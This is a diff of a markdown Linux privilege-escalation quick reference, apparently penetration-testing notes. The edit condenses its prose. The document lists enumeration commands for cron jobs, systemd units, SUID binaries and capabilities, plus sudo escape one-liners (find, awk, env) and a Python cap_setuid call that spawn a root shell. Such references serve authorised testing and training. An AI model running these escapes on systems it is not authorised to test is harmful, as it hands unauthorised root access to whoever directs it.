@@ -2,7 +2,7 @@
 
 [← Linux quick reference](../03-linux-privesc.md)
 
-Look for a command or file that root runs and your user can influence. Confirm the exact execution path, its arguments, and its trigger before changing anything.
+Find root-run command/file you control; confirm arguments and trigger.
 
 ## Find the path
 
@@ -14,7 +14,7 @@ find / -xdev -type d -user root -perm -0002 -ls 2>/dev/null
 namei -l /path/to/root-run-script
 ```
 
-For scheduled work, inspect the referenced unit or script. A timer's existence alone does not tell you which user its service runs as.
+Scheduled task: inspect unit/script and service user.
 
 ```bash
 cat /etc/crontab
@@ -24,7 +24,7 @@ systemctl cat <service>
 systemctl show <service> -p User,Group,ExecStart,Environment
 ```
 
-Check relative command names, writable paths, wildcards, and preserved environment variables:
+Check relative commands, writable paths, wildcards, preserved environment:
 
 ```bash
 echo "$PATH"
@@ -34,7 +34,7 @@ grep -R "\*" /etc/cron.* /etc/systemd/system /usr/lib/systemd/system 2>/dev/null
 
 ## Sudo and SUID
 
-Read the full `sudo -l` rule: command, arguments, `NOPASSWD`, and `env_keep`. A matching binary can have different escape paths across versions; check [GTFOBins](https://gtfobins.github.io/) and test the installed version.
+Read full `sudo -l`: command, args, `NOPASSWD`, `env_keep`. Check installed version against [GTFOBins](https://gtfobins.github.io/).
 
 ```bash
 sudo find . -exec /bin/sh \; -quit
@@ -42,7 +42,7 @@ sudo awk 'BEGIN{system("/bin/sh")}'
 sudo env /bin/sh
 ```
 
-A custom SUID program that calls a command without an absolute path is a candidate for PATH control. Inspect its calls first. `bash -p` preserves an effective UID on a confirmed SUID Bash path.
+SUID + relative command call → inspect PATH control. `bash -p` preserves effective UID.
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -50,15 +50,15 @@ getcap -r / 2>/dev/null
 strings <candidate-binary>
 ```
 
-If a binary with `cap_setuid+ep` can run Python code, verify the capability on that exact path before trying a UID change:
+Python binary with `cap_setuid+ep`:
 
 ```bash
 getcap /usr/bin/python3
 /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
 
-For a root-run cron or service script, check whether it calls a relative command name from a directory you can place earlier in `PATH`. For a wildcard archive job, check whether attacker-controlled filenames are passed as options to `tar`; a mere `*` in a script is not enough. `pspy` can help confirm when the job runs.
+Cron/service: relative command in controllable `PATH`, or attacker filenames passed as `tar` options. Use `pspy` to confirm trigger.
 
 ## Before modifying a root-run file
 
-Record its original contents and permissions. Make one change, trigger the known path, verify the result, then restore the original state.
+Save contents/permissions; test once; restore.
